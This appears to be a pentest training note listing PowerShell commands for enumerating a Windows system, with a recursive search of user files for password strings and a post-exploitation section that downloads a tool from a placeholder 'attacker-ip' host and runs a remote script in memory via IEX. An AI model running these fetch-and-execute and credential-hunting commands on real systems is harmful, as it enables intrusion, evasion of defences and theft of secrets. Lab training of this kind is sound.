# PowerShell for Security Enumeration

Practical PowerShell commands for enumerating a Windows system during a pentest.

## Processes

```powershell
# Top CPU consumers
Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name, CPU, Id, Path

# Find unusual process paths (not in System32 or Program Files)
Get-Process | Where-Object {$_.Path -notlike "*System32*" -and $_.Path -notlike "*Program Files*"} | Select Name, Id, Path

# Process with open network connections
Get-NetTCPConnection | Where-Object State -eq "Established" | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

## Services

```powershell
# All running services
Get-Service | Where-Object Status -eq "Running" | Select Name, DisplayName

# Services with non-standard binary paths (potential hijack)
Get-WmiObject Win32_Service | Select Name, PathName, StartMode | Where-Object PathName -notlike "*System32*"
```

## Scheduled Tasks

```powershell
# Ready/enabled tasks
Get-ScheduledTask | Where-Object State -eq "Ready" | Select TaskName, TaskPath

# Task details including executable
Get-ScheduledTask | Where-Object State -eq "Ready" | Select TaskName, @{n="Action";e={$_.Actions.Execute}}
```

## Network State

```powershell
Get-NetIPAddress | Select InterfaceAlias, IPAddress, PrefixLength
Get-NetTCPConnection | Where-Object State -eq "Listen" | Select LocalAddress, LocalPort, OwningProcess
Get-NetRoute | Select DestinationPrefix, NextHop, InterfaceAlias
```

## File System Search for Credentials

```powershell
# Search for password strings in text-based files
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.config,*.xml,*.ini,*.json -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|secret|api_key" |
  Select Path, LineNumber, Line

# Find recently modified files
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
  Select FullName, LastWriteTime | Sort LastWriteTime -Descending | Select -First 20
```

## Download Files (for post-exploitation tools)

```powershell
# Download a file
Invoke-WebRequest -Uri http://attacker-ip/tool.exe -OutFile C:\Temp\tool.exe

# One-liner in-memory execution (bypasses disk write)
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/script.ps1')
```

## Exercise

On your Windows VM:
1. Run `Get-Process | Sort CPU -Descending | Select -First 10` — list what you see
2. Run the service binary path query — any services with unusual paths?
3. Run the file search for passwords — did it find anything in `C:\Users`?
4. Run `Get-NetTCPConnection | Where State -eq Listen` — document all listening ports
